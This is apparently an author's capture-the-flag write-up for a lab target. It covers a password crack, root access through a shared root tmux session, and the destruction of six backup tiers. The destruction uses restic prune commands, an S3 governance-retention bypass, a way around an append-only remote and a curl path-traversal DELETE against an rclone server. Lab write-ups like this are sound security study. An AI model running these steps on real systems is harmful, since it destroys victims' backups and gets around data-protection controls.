# Flack Safety — SOLVED (author) 2026-11-14

Target: 10.83.5.75:22 (fullpwn, difficulty 3)
Box: k8s pod `backups-workstation-856d57c7f7-qlmnt`, kernel `4.19.0-gvisor`
Dashboard: http://backups-checker:8080/ (reachable from the workstation)

## FLAGS (both from the internal backup dashboard, shown once all 6 tiers are destroyed)
PP{g0v3rn4nc3_41nt_s4f3::Zh1GtuPgXwgA}
PP{p4th_tr4v3rs4l5_3v3rywh3r3::-W6km0eyl8Ro}

## Chain
### 0. Creds
Shipped `shadow.txt`: `employee:$argon2id$v=19$m=65536,t=3,p=1$<b64salt>$<b64hash>`.
**hashcat gotcha:** mode 34000 ("Argon2" generic) is BROKEN for `$argon2id$` and returns a
FALSE POSITIVE; it also fails the official hashcat example. Use **mode 70000 (Argon2id, bridged)**:
`hashcat -m 70000 hash.txt rockyou.txt --self-test-disable` -> password **iloveme**
(cracked in the first ~380 rockyou entries at 56 H/s; --self-test-disable is needed because the
OpenCL kernel self-test fails on this GPU).
-> `ssh employee@10.83.5.75` (password auth enabled).

### 1. Foothold + privesc (both from the world-readable/writable `/entrypoint.sh`)
`/entrypoint.sh` (0777!) reveals the whole design:
- Seeds restic repos via `resticprofile`; cron (root supercronic) every minute:
 `su -l employee -c 'resticprofile local-user.backup'` and `resticprofile root.backup`.
- Builds `/tmp/legacy.txt` (list of the retired legacy repo) and **opens a ROOT tmux session
 `ops` on employee's socket** with `tmux server-access -a employee` -> employee can drive it.
 `tmux -S /tmp/tmux-1000/default list-sessions` and `send-keys -t ops '<cmd>' Enter` => root.
- `/etc/crontab` is 0666 (world-writable, run as root) — a second, slower privesc.
Root obtained: `uid=0(root)` (runner: `work/rootrun.py`, `ssh_run.py`).

### 2. The backup infra (from `~/backups.txt` + `/etc/resticprofile/profiles.yaml`)
Restic password (all repos): **`flack-footage`**. Remote creds: `workstation:flack-rest`
(restic REST), `flack`/`flack-s3-secret` (S3). Six tiers, checked by the dashboard's own
Rust source (`curl http://backups-checker:8080/main.rs`):

| # | Tier | Where | How destroyed |
|---|------|-------|---------------|
| 1 | User Local | `/home/employee/backups` (restic) | as employee: `restic forget <all-ids> --prune` |
| 2 | Root Local | `/backups` (restic) | as root: same |
| 3 | Offsite Replica | `rest:http://backups-server:8001/footage` (rclone `--append-only`) | **append-only -> can't DELETE.** Push >=2 NEW snapshots in the SAME host+path group (`restic backup /home/employee/footage --host workstation` x2); the server-side `restic forget --keep-last 2 --prune` then drops the footage snapshots ("it deleted itself"). |
| 4 | S3 Governance | `s3:http://backups-server:7070/footage` (versitygw, versioned + Object Lock) | `aws s3api list-object-versions` -> `delete-objects` of every Version+DeleteMarker with `--bypass-governance-retention` (lock is GOVERNANCE, key may bypass). Loop until 0; repo (config/keys/data/...) gone -> restic "no repository". |
| 5 | Rclone Remote 1 | `rest:http://backups-server:8000/workstation/footage` (rclone `--private-repos`) | as root: `restic forget <ids> --prune` with `workstation:flack-rest` |
| 6 | Old Rclone Remote | `/data/rclone/workstation-legacy` on the server (any file = intact) | **rclone path-traversal auth bypass:** `curl --path-as-is -u workstation:flack-rest -X DELETE http://backups-server:8000/workstation/../workstation-legacy/footage/<obj>` -> 200 (direct `.../workstation-legacy/...` is 403). Deleted config, keys/*, snapshots/*, index/*, data/*/* -> dir has no files -> destroyed. |

Gotchas:
- `restic forget` needs explicit snapshot IDs (or a real policy): `--keep-last 0` is rejected as
 "no policy was specified"; and `--no-lock` is invalid for `forget`.
- Default forget grouping is host+path — new "empty" snapshots must match the victim snapshot's
 host AND path to fall in the same keep-last-N group.
- Stopped the re-backup loop by emptying world-writable `/etc/crontab` (saved `/tmp/crontab.bak`).
- `aws` CLI hangs on IMDS in this cluster: set `AWS_EC2_METADATA_DISABLED=true` (and a region).

## Privesc summary (formatted)
employee -> root: world-readable `/entrypoint.sh` discloses a root tmux session on employee's
socket; `tmux ... send-keys -t ops 'id' Enter` yields `uid=0(root)`. Backup credentials then live
in root's cron environment (`/etc/crontab`).

## Artifacts (work/)
- `ssh_run.py` — pexpect SSH runner (employee/iloveme)
- `rootrun.py` — run commands as root via the tmux `ops` session
- `checker_main.rs` — downloaded dashboard checker source
- `hc70000.pot` — the correct Argon2id crack (`:iloveme`)
